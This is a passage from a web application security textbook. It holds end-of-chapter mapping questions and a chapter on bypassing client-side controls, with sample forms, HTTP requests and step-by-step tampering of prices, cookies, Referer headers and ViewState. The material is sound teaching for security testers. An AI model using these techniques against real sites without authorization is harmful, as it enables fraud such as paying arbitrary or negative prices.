your own experience. The core methodology we have outlined involves the 
following:
n Manual browsing and user-directed spidering to enumerate the application‚Äôs visible content and functionality
n Use of brute force combined with human inference and intuition to discover as much hidden content as possible
n An intelligent analysis of the application to identify its key functionality, 
behavior, security mechanisms, and technologies
n An assessment of the application‚Äôs attack surface, highlighting the most 
promising functions and behavior for more focused probing into exploitable vulnerabilities
Questions
Answers can be found at http://mdsec.net/wahh.
 1. While mapping an application, you encounter the following URL:
https://wahh-app.com/CookieAuth.dll?GetLogon?curl=Z2Fdefault.
aspx
What information can you deduce about the technologies employed on 
the server and how it is likely to behave?
 2. The application you are targeting implements web forum functionality. 
Here is the only URL you have discovered:
http://wahh-app.com/forums/ucp.php?mode=register
How might you obtain a listing of forum members?
c04.indd 114 c04.indd 114 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 115
 Chapter 4 n Mapping the Application 115
 3. While mapping an application, you encounter the following URL:
https://wahh-app.com/public/profile/Address.
asp?action=view&location
=default
What information can you infer about server-side technologies? What 
can you conjecture about other content and functionality that may exist?
 4. A web server‚Äôs responses include the following header:
Server: Apache-Coyote/1.1
What does this indicate about the technologies in use on the server?
 5. You are mapping two different web applications, and you request the URL 
/admin.cpf from each application. The response headers returned by each 
request are shown here. From these headers alone, what can you deduce 
about the presence of the requested resource within each application?
HTTP/1.1 200 OK
Server: Microsoft-IIS/5.0
Expires: Mon, 20 Jun 2011 14:59:21 GMT
Content-Location: http://wahhapp.com/includes/error.htm?404;http://wahh-app.com/admin.cpf
Date: Mon, 20 Jun 2011 14:59:21 GMT
Content-Type: text/html
Accept-Ranges: bytes
Content-Length: 2117
HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
WWW-Authenticate: Basic realm=‚ÄùWahh Administration Site‚Äù
Content-Type: text/html;charset=utf-8
Content-Length: 954
Date: Mon, 20 Jun 2011 15:07:27 GMT
Connection: close
c04.indd 115 c04.indd 115 8/19/2011 12:04:47 PM 8/19/2011 12:04:47 PM
Stuttard c04.indd V3 - 07/22/2011 Page 116
c04.indd 116 c04.indd 116 8/19/2011 12:04:47 PM 8/19/2011 12:04:47 PM
Stuttard c05.indd V3 - 07/22/2011 Page 117
117
 C H A P T E R 
5
Bypassing Client-Side Controls
Chapter 1 described how the core security problem with web applications arises 
because clients can submit arbitrary input. Despite this fact, a large proportion 
of web applications, nevertheless, rely on various measures implemented on 
the client side to control the data that they submit to the server. In general, this 
represents a fundamental security fl aw: the user has full control over the client 
and the data it submits and can bypass any controls that are implemented on 
the client side and are not replicated on the server.
An application may rely on client-side controls to restrict user input in two 
broad ways. First, an application may transmit data via the client component 
using a mechanism that it assumes will prevent the user from modifying that 
data when the application later reads it. Second, an application may implement 
measures on the client side that control the user‚Äôs interaction with his or her 
own client, with the aim of restricting functionality and/or applying controls 
around user input before it is submitted. This may be achieved using HTML 
form features, client-side scripts, or browser extension technologies.
This chapter looks at examples of each kind of client-side control and describes 
ways in which they can be bypassed.
c05.indd 117 c05.indd 117 8/19/2011 12:05:40 PM 8/19/2011 12:05:40 PM
Stuttard c05.indd V3 - 07/22/2011 Page 118
118 Chapter 5 n Bypassing Client-Side Controls
Transmitting Data Via the Client
It is common to see an application passing data to the client in a form that the 
end user cannot directly see or modify, with the expectation that this data 
will be sent back to the server in a subsequent request. Often, the application‚Äôs 
developers simply assume that the transmission mechanism used will ensure 
that the data transmitted via the client will not be modifi ed along the way.
Because everything submitted from the client to the server is within the 
user‚Äôs control, the assumption that data transmitted via the client will not be 
modifi ed is usually false and often leaves the application vulnerable to one or 
more attacks.
You may reasonably wonder why, if the server knows and specifi es a particular 
item of data, the application would ever need to transmit this value to the client 
and then read it back. In fact, writing applications in this way is often easier for 
developers for various reasons:
n It removes the need to keep track of all kinds of data within the user‚Äôs 
session. Reducing the amount of per-session data being stored on the 
server can also improve the application‚Äôs performance.
n If the application is deployed on several distinct servers, with users potentially interacting with more than one server to perform a multistep action, 
it may not be straightforward to share server-side data between the hosts 
that may handle the same user‚Äôs requests. Using the client to transmit data 
can be a tempting solution to the problem.
n If the application employs any third-party components on the server, 
such as shopping carts, modifying these may be diffi cult or impossible, so 
transmitting data via the client may be the easiest way of integrating these.
n In some situations, tracking a new piece of data on the server may entail 
updating a core server-side API, thereby triggering a full-blown formal 
change-management process and regression testing. Implementing a more 
piecemeal solution involving client-side data transmission may avoid this, 
allowing tight deadlines to be met.
However, transmitting sensitive data in this way is usually unsafe and has 
been the cause of countless vulnerabilities in applications.
Hidden Form Fields
Hidden HTML form fi elds are a common mechanism for transmitting data via 
the client in a superfi cially unmodifi able way. If a fi eld is fl agged as hidden, 
it is not displayed on-screen. However, the fi eld‚Äôs name and value are stored 
within the form and are sent back to the application when the user submits 
the form.
c05.indd 118 c05.indd 118 8/19/2011 12:05:40 PM 8/19/2011 12:05:40 PM
Stuttard c05.indd V3 - 07/22/2011 Page 119
 Chapter 5 n Bypassing Client-Side Controls 119
The classic example of this security fl aw is a retailing application that stores 
the prices of products within hidden form fi elds. In the early days of web applications, this vulnerability was extremely widespread, and by no means has it 
been eliminated today. Figure 5-1 shows a typical form.
Figure 5-1: A typical HTML form
The code behind this form is as follows:
<form method=‚Äùpost‚Äù action=‚ÄùShop.aspx?prod=1‚Äù>
Product: iPhone 5 <br/>
Price: 449 <br/>
Quantity: <input type=‚Äùtext‚Äù name=‚Äùquantity‚Äù> (Maximum quantity is 50) 
<br/>
<input type=‚Äùhidden‚Äù name=‚Äùprice‚Äù value=‚Äù449‚Äù>
<input type=‚Äùsubmit‚Äù value=‚ÄùBuy‚Äù>
</form>
Notice the form fi eld called price, which is fl agged as hidden. This fi eld is sent 
to the server when the user submits the form:
POST /shop/28/Shop.aspx?prod=1 HTTP/1.1
Host: mdsec.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
quantity=1&price=449
TRY IT!
http://mdsec.net/shop/28/
Although the price fi eld is not displayed on-screen, and the user cannot edit 
it, this is solely because the application has instructed the browser to hide the
fi eld. Because everything that occurs on the client side is ultimately within 
the user‚Äôs control, this restriction can be circumvented to edit the price.
One way to achieve this is to save the source code for the HTML page, edit 
the fi eld‚Äôs value, reload the source into a browser, and click the Buy button. 
However, an easier and more elegant method is to use an intercepting proxy to 
modify the desired data on-the-fl y.
c05.indd 119 c05.indd 119 8/19/2011 12:05:40 PM 8/19/2011 12:05:40 PM
Stuttard c05.indd V3 - 07/22/2011 Page 120
120 Chapter 5 n Bypassing Client-Side Controls
An intercepting proxy is tremendously useful when attacking a web application and is the one truly indispensable tool you need. Numerous such tools are 
available. We will use Burp Suite, which was written by one of this book‚Äôs authors.
The proxy sits between your web browser and the target application. It intercepts every request issued to the application, and every response received back, 
for both HTTP and HTTPS. It can trap any intercepted message for inspection 
or modifi cation by the user. If you haven‚Äôt used an intercepting proxy before, 
you can read more about how they function, and how to get them confi gured 
and working, in Chapter 20.
Once an intercepting proxy has been installed and suitably confi gured, you 
can trap the request that submits the form and modify the price fi eld to any 
value, as shown in Figure 5-2.
Figure 5-2: Modifying the values of hidden form fields using an intercepting proxy
If the application processes the transaction based on the price submitted, you 
can purchase the product for the price of your choice.
TIP If you fi nd an application that is vulnerable in this way, see whether you 
can submit a negative amount as the price. In some cases, applications have 
actually accepted transactions using negative prices. The attacker receives a 
refund to his credit card and also the item he ordered ‚Äî a win-win situation, if 
ever there was one.
c05.indd 120 c05.indd 120 8/19/2011 12:05:40 PM 8/19/2011 12:05:40 PM
Stuttard c05.indd V3 - 07/22/2011 Page 121
 Chapter 5 n Bypassing Client-Side Controls 121
HTTP Cookies
Another common mechanism for transmitting data via the client is HTTP cookies. As with hidden form fi elds, normally these are not displayed on-screen, and 
the user cannot modify them directly. They can, of course, be modifi ed using 
an intercepting proxy, by changing either the server response that sets them or 
subsequent client requests that issue them.
Consider the following variation on the previous example. After the customer 
has logged in to the application, she receives the following response:
HTTP/1.1 200 OK
Set-Cookie: DiscountAgreed=25
Content-Length: 1530
...
This DiscountAgreed cookie points to a classic case of relying on client-side 
controls (the fact that cookies normally can‚Äôt be modifi ed) to protect data transmitted via the client. If the application trusts the value of the DiscountAgreed
cookie when it is submitted back to the server, customers can obtain arbitrary 
discounts by modifying its value. For example:
POST /shop/92/Shop.aspx?prod=3 HTTP/1.1
Host: mdsec.net
Cookie: DiscountAgreed=25
Content-Length: 10
quantity=1 
TRY IT!
http://mdsec.net/shop/92/
URL Parameters
Applications frequently transmit data via the client using preset URL parameters. For example, when a user browses the product catalog, the application 
may provide him with hyperlinks to URLs like the following:
http://mdsec.net/shop/?prod=3&pricecode=32
When a URL containing parameters is displayed in the browser‚Äôs location bar, 
any parameters can be modifi ed easily by any user without the use of tools. 
However, in many instances an application may expect that ordinary users 
cannot view or modify URL parameters:
n Where embedded images are loaded using URLs containing parameters
n Where URLs containing parameters are used to load a frame‚Äôs contents
c05.indd 121 c05.indd 121 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 122
122 Chapter 5 n Bypassing Client-Side Controls
n Where a form uses the POST method and its target URL contains preset 
parameters
n Where an application uses pop-up windows or other techniques to conceal 
the browser location bar
Of course, in any such case the values of any URL parameters can be modifi ed 
as previously discussed using an intercepting proxy.
The Referer Header
Browsers include the Referer header within most HTTP requests. It is used to 
indicate the URL of the page from which the current request originated ‚Äî either 
because the user clicked a hyperlink or submitted a form, or because the page 
referenced other resources such as images. Hence, it can be leveraged as a 
mechanism for transmitting data via the client. Because the URLs processed by 
the application are within its control, developers may assume that the Referer
header can be used to reliably determine which URL generated a particular 
request.
For example, consider a mechanism that enables users to reset their password 
if they have forgotten it. The application requires users to proceed through 
several steps in a defi ned sequence before they actually reset their password‚Äôs 
value with the following request:
GET /auth/472/CreateUser.ashx HTTP/1.1
Host: mdsec.net
Referer: https://mdsec.net/auth/472/Admin.ashx
The application may use the Referer header to verify that this request originated from the correct stage (Admin.ashx). If it did, the user can access the 
requested functionality.
However, because the user controls every aspect of every request, including 
the HTTP headers, this control can be easily circumvented by proceeding directly 
to CreateUser.ashx and using an intercepting proxy to change the value of the 
Referer header to the value that the application requires.
The Referer header is strictly optional according to w3.org standards. Hence, 
although most browsers implement it, using it to control application functionality should be regarded as a hack.
TRY IT!
http://mdsec.net/auth/472/
c05.indd 122 c05.indd 122 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 123
 Chapter 5 n Bypassing Client-Side Controls 123
COMMON MYTH
It is often assumed that HTTP headers are somehow more ‚Äútamper-proof‚Äù 
than other parts of the request, such as the URL. This may lead developers to 
implement functionality that trusts the values submitted in headers such as 
Cookie and Referer while performing proper validation of other data such 
as URL parameters. However, this perception is false. Given the multitude of 
intercepting proxy tools that are freely available, any amateur hacker who 
targets an application can change all request data with ease. It is rather like 
supposing that when the teacher comes to search your desk, it is safer to hide 
your water pistol in the bottom drawer, because she will need to bend down 
farther to discover it.
HACK STEPS
 1. Locate all instances within the application where hidden form fields, 
cookies, and URL parameters are apparently being used to transmit data 
via the client.
 2. Attempt to determine or guess the role that the item plays in the application‚Äôs logic, based on the context in which it appears and on clues such as 
the parameter‚Äôs name.
 3. Modify the item‚Äôs value in ways that are relevant to its purpose in the 
application. Ascertain whether the application processes arbitrary values 
submitted in the parameter, and whether this exposes the application to 
any vulnerabilities.
Opaque Data
Sometimes, data transmitted via the client is not transparently intelligible 
because it has been encrypted or obfuscated in some way. For example, instead 
of seeing a product‚Äôs price stored in a hidden fi eld, you may see a cryptic value 
being transmitted:
<form method=‚Äùpost‚Äù action=‚ÄùShop.aspx?prod=4‚Äù>
Product: Nokia Infinity <br/>
Price: 699 <br/>
Quantity: <input type=‚Äùtext‚Äù name=‚Äùquantity‚Äù> (Maximum quantity is 50) 
<br/>
<input type=‚Äùhidden‚Äù name=‚Äùprice‚Äù value=‚Äù699‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùpricing_token‚Äù 
value=‚ÄùE76D213D291B8F216D694A34383150265C989229‚Äù>
<input type=‚Äùsubmit‚Äù value=‚ÄùBuy‚Äù>
</form>
c05.indd 123 c05.indd 123 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 124
124 Chapter 5 n Bypassing Client-Side Controls
When this is observed, you may reasonably infer that when the form is submitted, the server-side application checks the integrity of the opaque string, or 
even decrypts or deobfuscates it to perform some processing on its plaintext 
value. This further processing may be vulnerable to any kind of bug. However, to 
probe for and exploit this, fi rst you need to wrap up your payload appropriately.
TRY IT!
http://mdsec.net/shop/48/
NOTE Opaque data items transmitted via the client are often part of the 
application‚Äôs session-handling mechanism. Session tokens sent in HTTP cookies, anti-CSRF tokens transmitted in hidden fi elds, and one-time URL tokens 
for accessing application resources, are all potential targets for client-side 
tampering. Numerous considerations are specifi c to these kinds of tokens, as 
discussed in depth in Chapter 7.
HACK STEPS
Faced with opaque data being transmitted via the client, several avenues of 
attack are possible:
 1. If you know the value of the plaintext behind the opaque string, you can 
attempt to decipher the obfuscation algorithm being employed.
 2. As described in Chapter 4, the application may contain functions elsewhere that you can leverage to return the opaque string resulting from a 
piece of plaintext you control. In this situation, you may be able to directly 
obtain the required string to deliver an arbitrary payload to the function 
you are targeting.
 3. Even if the opaque string is impenetrable, it may be possible to replay 
its value in other contexts to achieve a malicious effect. For example, the 
pricing_token parameter in the previously shown form may contain 
an encrypted version of the product‚Äôs price. Although it is not possible to 
produce the encrypted equivalent for an arbitrary price of your choosing, 
you may be able to copy the encrypted price from a different, cheaper 
product and submit this in its place.
 4. If all else fails, you can attempt to attack the server-side logic that will 
decrypt or deobfuscate the opaque string by submitting malformed variations of it ‚Äî for example, containing overlong values, different character 
sets, and the like.
The ASP.NET ViewState
One commonly encountered mechanism for transmitting opaque data via the 
client is the ASP.NET ViewState. This is a hidden fi eld that is created by default 
in all ASP.NET web applications. It contains serialized information about the 
c05.indd 124 c05.indd 124 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 125
 Chapter 5 n Bypassing Client-Side Controls 125
state of the current page. The ASP.NET platform employs the ViewState to 
enhance server performance. It enables the server to preserve elements within 
the user interface across successive requests without needing to maintain all 
the relevant state information on the server side. For example, the server may 
populate a drop-down list on the basis of parameters submitted by the user. 
When the user makes subsequent requests, the browser does not submit the 
contents of the list back to the server. However, the browser does submit the 
hidden ViewState fi eld, which contains a serialized form of the list. The server 
deserializes the ViewState and recreates the same list that is presented to the 
user again.
In addition to this core purpose of the ViewState, developers can use it to 
store arbitrary information across successive requests. For example, instead of 
saving the product‚Äôs price in a hidden form fi eld, an application may save it in 
the ViewState as follows:
string price = getPrice(prodno);
ViewState.Add(‚Äúprice‚Äù, price);
The form returned to the user now looks something like this:
<form method=‚Äùpost‚Äù action=‚ÄùShop.aspx?prod=3‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äù__VIEWSTATE‚Äù id=‚Äù__VIEWSTATE‚Äù 
value=‚Äù/wEPDwULLTE1ODcxNjkwNjIPFgIeBXByaWNlBQMzOTlkZA==‚Äù />
Product: HTC Avalanche <br/>
Price: 399 <br/>
Quantity: <input type=‚Äùtext‚Äù name=‚Äùquantity‚Äù> (Maximum quantity is 50) 
<br/>
<input type=‚Äùsubmit‚Äù value=‚ÄùBuy‚Äù>
</form>
When the user submits the form, her browser sends the following:
POST /shop/76/Shop.aspx?prod=3 HTTP/1.1
Host: mdsec.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
__VIEWSTATE=%2FwEPDwULLTE1ODcxNjkwNjIPFgIeBXByaWNlBQMzOTlkZA%3D%3D&
quantity=1
The request apparently does not contain the product price ‚Äî only the quantity ordered and the opaque ViewState parameter. Changing that parameter at 
random results in an error message, and the purchase is not processed.
The ViewState parameter is actually a Base64-encoded string that can be 
easily decoded to see the price parameter that has been placed there:
3D FF 01 0F 0F 05 0B 2D 31 35 38 37 31 36 39 30 ; =√ø.....-15871690
36 32 0F 16 02 1E 05 70 72 69 63 65 05 03 33 39 ; 62.....price..39
39 64 64 ; 9dd
c05.indd 125 c05.indd 125 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 126
126 Chapter 5 n Bypassing Client-Side Controls
TIP When you attempt to decode what appears to be a Base64-encoded 
string, a common mistake is to begin decoding at the wrong position within the 
string. Because of how Base64 encoding works, if you start at the wrong position, the decoded string will contain gibberish. Base64 is a block-based format 
in which every 4 bytes of encoded data translates into 3 bytes of decoded data. 
Hence, if your attempts to decode a Base64 string do not uncover anything 
meaningful, try starting from four adjacent offsets into the encoded string.
By default, the ASP.NET platform protects the ViewState from tampering by 
adding a keyed hash to it (known as MAC protection). However, some applications 
disable this default protection, meaning that you can modify the ViewState‚Äôs value 
to determine whether it has an effect on the application‚Äôs server-side processing.
Burp Suite includes a ViewState parser that indicates whether the ViewState
is MAC protected, as shown in Figure 5-3. If it is not protected, you can edit the 
contents of the ViewState within Burp using the hex editor below the ViewState
tree. When you send the message to the server or client, Burp sends your updated 
ViewState, and, in the present example, enables you to change the price of the 
item being purchased.
Figure 5-3: Burp Proxy can decode and render the ViewState, allowing you to 
review its contents and edit these if the EnableViewStateMac option is not set
c05.indd 126 c05.indd 126 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 127
 Chapter 5 n Bypassing Client-Side Controls 127
TRY IT!
http://mdsec.net/shop/76/
HACK STEPS
 1. If you are attacking an ASP.NET application, verify whether MAC protection is enabled for the ViewState. This is indicated by the presence of a 
20-byte hash at the end of the ViewState structure, and you can use the 
ViewState parser in Burp Suite to confirm whether this is present.
 2. Even if the ViewState is protected, use Burp to decode the ViewState
on various application pages to discover whether the application is using 
the ViewState to transmit any sensitive data via the client.
 3. Try to modify the value of a specific parameter within the ViewState
without interfering with its structure, and see whether an error message 
results.
 4. If you can modify the ViewState without causing errors, you should 
review the function of each parameter within the ViewState and 
see whether the application uses it to store any custom data. Try to 
submit crafted values as each parameter to probe for common vulnerabilities, as you would for any other item of data being transmitted 
via the client.
 5. Note that MAC protection may be enabled or disabled on a per-page 
basis, so it may be necessary to test each significant page of the application for ViewState hacking vulnerabilities. If you are using Burp Scanner 
with passive scanning enabled, Burp automatically reports any pages that 
use the ViewState without MAC protection enabled.
Capturing User Data: HTML Forms
The other principal way in which applications use client-side controls to restrict 
data submitted by clients occurs with data that was not originally specifi ed by 
the server but that was gathered on the client computer itself.
HTML forms are the simplest and most common way to capture input from 
the user and submit it to the server. With the most basic uses of this method, 
users type data into named text fi elds, which are submitted to the server as 
name/value pairs. However, forms can be used in other ways; they can impose 
restrictions or perform validation checks on the user-supplied data. When an 
c05.indd 127 c05.indd 127 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 128
128 Chapter 5 n Bypassing Client-Side Controls
application employs these client-side controls as a security mechanism to defend 
itself against malicious input, the controls can usually be easily circumvented, 
leaving the application potentially vulnerable to attack.
Length Limits
Consider the following variation on the original HTML form, which imposes 
a maximum length of 1 on the quantity fi eld:
<form method=‚Äùpost‚Äù action=‚ÄùShop.aspx?prod=1‚Äù>
Product: iPhone 5 <br/>
Price: 449 <br/>
Quantity: <input type=‚Äùtext‚Äù name=‚Äùquantity‚Äù maxlength=‚Äù1‚Äù> <br/>
<input type=‚Äùhidden‚Äù name=‚Äùprice‚Äù value=‚Äù449‚Äù>
<input type=‚Äùsubmit‚Äù value=‚ÄùBuy‚Äù>
</form>
Here, the browser prevents the user from entering more than one character 
into the input fi eld, so the server-side application may assume that the quantity
parameter it receives will be less than 10. However, this restriction can easily be 
circumvented either by intercepting the request containing the form submission 
to enter an arbitrary value, or by intercepting the response containing the form 
to remove the maxlength attribute.
INTERCEPTING RESPONSES
When you attempt to intercept and modify server responses, you may fi nd 
that the relevant message displayed in your proxy looks like this:
HTTP/1.1 304 Not Modified
Date: Wed, 6 Jul 2011 22:40:20 GMT
Etag: ‚Äú6c7-5fcc0900‚Äù
Expires: Thu, 7 Jul 2011 00:40:20 GMT
Cache-Control: max-age=7200
This response arises because the browser already possesses a cached copy 
of the resource it requested. When the browser requests a cached resource, 
it typically adds two headers to the request ‚Äî If-Modified-Since and 
If-None-Match:
GET /scripts/validate.js HTTP/1.1
Host: wahh-app.com
If-Modified-Since: Sat, 7 Jul 2011 19:48:20 GMT
If-None-Match: ‚Äú6c7-5fcc0900‚Äù
These headers tell the server when the browser last updated its cached copy. 
The Etag string, which the server provided with that copy of the resource, 
is a kind of serial number that the server assigns to each cacheable resource.
c05.indd 128 c05.indd 128 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 129
 Chapter 5 n Bypassing Client-Side Controls 129
It updates each time the resource is modifi ed. If the server possesses a newer 
version of the resource than the date specifi ed in the If-Modified-Since
header, or if the Etag of the current version matches the one specifi ed in the 
If-None-Match header, the server responds with the latest version of the 
resource. Otherwise, it returns a 304 response, as shown here, informing the 
browser that the resource has not been modifi ed and that the browser should 
use its cached copy.
When this occurs, and you need to intercept and modify the resource that 
the browser has cached, you can intercept the relevant request and remove 
the If-Modified-Since and If-None-Match headers. This causes the server 
to respond with the full version of the requested resource. Burp Proxy contains an option to strip these headers from every request, thereby overriding 
all cache information sent by the browser.
HACK STEPS
 1. Look for form elements containing a maxlength attribute. Submit data 
that is longer than this length but that is formatted correctly in other 
respects (for example, it is numeric if the application expects a number).
 2. If the application accepts the overlong data, you may infer that the clientside validation is not replicated on the server.
 3. Depending on the subsequent processing that the application performs 
on the parameter, you may be able to leverage the defects in validation to 
exploit other vulnerabilities, such as SQL injection, cross-site scripting, or 
buffer overflows.
Script-Based Validation
The input validation mechanisms built into HTML forms themselves are extremely 
simple and are insuffi ciently fi ne-grained to perform relevant validation of 
many kinds of input. For example, a user registration form might contain fi elds 
for name, e-mail address, telephone number, and zip code, all of which expect 
different types of input. Therefore, it is common to see customized client-side 
input validation implemented within scripts. Consider the following variation 
on the original example:
<form method=‚Äùpost‚Äù action=‚ÄùShop.aspx?prod=2‚Äù onsubmit=‚Äùreturn 
validateForm(this)‚Äù>
Product: Samsung Multiverse <br/>
Price: 399 <br/>
c05.indd 129 c05.indd 129 8/19/2011 12:05:41 PM 8/19/2011 12:05:41 PM
Stuttard c05.indd V3 - 07/22/2011 Page 130
130 Chapter 5 n Bypassing Client-Side Controls
Quantity: <input type=‚Äùtext‚Äù name=‚Äùquantity‚Äù> (Maximum quantity is 50) 
<br/>
<input type=‚Äùsubmit‚Äù value=‚ÄùBuy‚Äù>
</form>
<script>function validateForm(theForm)
{
 var isInteger = /^\d+$/;
 var valid = isInteger.test(quantity) &&
 quantity > 0 && quantity <= 50;
 if (!valid)
 alert(‚ÄôPlease enter a valid quantity‚Äô);
 return valid;
}
</script>
TRY IT!
http://mdsec.net/shop/139/
The onsubmit attribute of the form tag instructs the browser to execute the 
ValidateForm function when the user clicks the Submit button, and to submit 
the form only if this function returns true. This mechanism enables the clientside logic to intercept an attempted form submission, perform customized 
validation checks on the user‚Äôs input, and decide whether to accept that input. 
In the preceding example, the validation is simple; it checks whether the data 
entered in the amount fi eld is an integer and is between 1 and 50.
Client-side controls of this kind are usually easy to circumvent. Usually 
it is suffi cient to disable JavaScript within the browser. If this is done, the 
onsubmit attribute is ignored, and the form is submitted without any custom 
validation.
However, disabling JavaScript may break the application if it depends on 
client-side scripting for its normal operation (such as constructing parts of the 
user interface). A neater approach is to enter a benign (known good) value into 
the input fi eld in the browser, intercept the validated submission with your 
proxy, and modify the data to your desired value. This is often the easiest and 
most elegant way to defeat JavaScript-based validation.
Alternatively, you can intercept the server‚Äôs response that contains the 
JavaScript validation routine and modify the script to neutralize its effect ‚Äî in 
the previous example, by changing the ValidateForm function to return true 
in every case.
c05.indd 130 c05.indd 130 8/19/2011 12:05:42 PM 8/19/2011 12:05:42 PM
Stuttard c05.indd V3 - 07/22/2011 Page 131
 Chapter 5 n Bypassing Client-Side Controls 131
HACK STEPS
 1. Identify any cases where client-side JavaScript is used to perform input 
validation prior to form submission.
 2. Submit data to the server that the validation ordinarily would have 
blocked, either by modifying the submission request to inject invalid data 
or by modifying the form validation code to neutralize it.
 3. As with length restrictions, determine whether the client-side controls are 
replicated on the server and, if not, whether this can be exploited for any 
malicious purpose.
 4. Note that if multiple input fields are subjected to client-side validation 
prior to form submission, you need to test each field individually with 
invalid data while leaving valid values in all the other fields. If you submit 
invalid data in multiple fields simultaneously, the server might stop processing the form when it identifies the first invalid field. Therefore, your 
testing won‚Äôt reach all possible code paths within the application.
NOTE Client-side JavaScript routines to validate user input are common in 
web applications, but do not conclude that every such application is vulnerable. The application is exposed only if client-side validation is not replicated 
on the server, and even then only if crafted input that circumvents client-side 
validation can be used to cause some undesirable behavior by the application.
In the majority of cases, client-side validation of user input has benefi cial effects 
on the application‚Äôs performance and the quality of the user experience. For 
example, when fi lling out a detailed registration form, an ordinary user might 
make various mistakes, such as omitting required fi elds or formatting his telephone number incorrectly. In the absence of client-side validation, correcting 
these mistakes may entail several reloads of the page and round-trip messages 
to the server. Implementing basic validation checks on the client side makes 
the user‚Äôs experience much smoother and reduces the load on the server.
Disabled Elements
If an element on an HTML form is fl agged as disabled, it appears on-screen 
but is usually grayed out and cannot be edited or used in the way an ordinary 
control can be. Also, it is not sent to the server when the form is submitted. For 
example, consider the following form:
<form method=‚Äùpost‚Äù action=‚ÄùShop.aspx?prod=5‚Äù>
Product: Blackberry Rude <br/>
Price: <input type=‚Äùtext‚Äù disabled=‚Äùtrue‚Äù name=‚Äùprice‚Äù value=‚Äù299‚Äù> 
c05.indd 131 c05.indd 131 8/19/2011 12:05:42 PM 8/19/2011 12:05:42 PM
Stuttard c05.indd V3 - 07/22/2011 Page 132
132 Chapter 5 n Bypassing Client-Side Controls
<br/>
Quantity: <input type=‚Äùtext‚Äù name=‚Äùquantity‚Äù> (Maximum quantity is 50) 
<br/>
<input type=‚Äùsubmit‚Äù value=‚ÄùBuy‚Äù>
</form>
This includes the price of the product as a disabled text fi eld and appears 
on-screen as shown in Figure 5-4.
Figure 5-4: A form containing a disabled input field
When this form is submitted, only the quantity parameter is sent to the 
server. However, the presence of a disabled fi eld suggests that a price parameter 
may originally have been used by the application, perhaps for testing purposes 
during development. This parameter would have been submitted to the server 
and may have been processed by the application. In this situation, you should 
defi nitely test whether the server-side application still processes this parameter. 
If it does, seek to exploit this fact.
TRY IT!
http://mdsec.net/shop/104/
HACK STEPS
 1. Look for disabled elements within each form of the application. Whenever 
you find one, try submitting it to the server along with the form‚Äôs other 
parameters to determine whether it has any effect.
 2. Often, submit elements are flagged as disabled so that buttons appear 
as grayed out in contexts when the relevant action is unavailable. You 
should always try to submit the names of these elements to determine 
whether the application performs a server-side check before attempting 
to carry out the requested action.
c05.indd 132 c05.indd 132 8/19/2011 12:05:42 PM 8/19/2011 12:05:42 PM
Stuttard c05.indd V3 - 07/22/2011 Page 133
 Chapter 5 n Bypassing Client-Side Controls 133
 3. Note that browsers do not include disabled form elements when forms 
are submitted. Therefore, you will not identify these if you simply walk 
through the application‚Äôs functionality, monitoring the requests issued 
by the browser. To identify disabled elements, you need to monitor the 
server‚Äôs responses or view the page source in your browser.
 4. You can use the HTML modification feature in Burp Proxy to automatically 
re-enable any disabled fields used within the application.
Capturing User Data: Browser Extensions
Besides HTML forms, the other main method for capturing, validating, and 
submitting user data is to use a client-side component that runs in a browser 
extension, such as Java or Flash. When fi rst employed in web applications, browser 
extensions were often used to perform simple and often cosmetic tasks. Now, 
companies are increasingly using browser extensions to create fully functional 
client-side components. These run within the browser, across multiple client 
platforms, and provide feedback, fl exibility, and handling of a desktop application. A side effect is that processing tasks that previously would have taken 
place on the server may be offl oaded onto the client for reasons of speed and 
user experience. In some cases, such as online trading applications, speed is so 
critical that much of the key application logic takes place on the client side. The 
application design may deliberately sacrifi ce security in favor of speed, perhaps 
in the mistaken belief that traders are trusted users, or that the browser extension includes its own defenses. Recalling the core security problem discussed 
in Chapter 2, and the earlier sections of this chapter, we know that the concept 
of a client-side component defending its business logic is impossible.
Browser extensions can capture data in various ways ‚Äî via input forms 
and in some cases by interacting with the client operating system‚Äôs fi lesystem 
or registry. They can perform arbitrarily complex validation and manipulation of captured data before submission to the server. Furthermore, because 
their internal workings are less transparent than HTML forms and JavaScript, 
developers are more likely to assume that the validation they perform cannot 
be circumvented. For this reason, browser extensions are often a fruitful target 
for discovering vulnerabilities within web applications.
A classic example of a browser extension that applies controls on the client 
side is a casino component. Given what we have observed about the fallible 
nature of client-side controls, the idea of implementing an online gambling 
application using a browser extension that runs locally on a potential attacker‚Äôs 
c05.indd 133 c05.indd 133 8/19/2011 12:05:42 PM 8/19/2011 12:05:42 PM
Stuttard c05.indd V3 - 07/22/2011 Page 134
134 Chapter 5 n Bypassing Client-Side Controls
machine is intriguing. If any aspect of the game play is controlled within the 
client instead of by the server, an attacker could manipulate the game with 
precision to improve the odds, change the rules, or alter the scores submitted 
to the server. Several kinds of attacks could occur in this scenario:
n The client component could be trusted to maintain the game state. In this 
instance, local tampering with the game state would give an attacker an 
advantage in the game.
n An attacker could bypass a client-side control and perform an illegal action 
designed to give himself an advantage within the game.
n An attacker could fi nd a hidden function, parameter, or resource that, 
when invoked, allows illegitimate access to a server-side resource.
n If the game involves any peers, or a house player, the client component 
could be receiving and processing information about other players that, 
if known, could be used to the attacker‚Äôs advantage.
Common Browser Extension Technologies
The browser extension technologies you are most likely to encounter are Java 
applets, Flash, and Silverlight. Because these are competing to achieve similar 
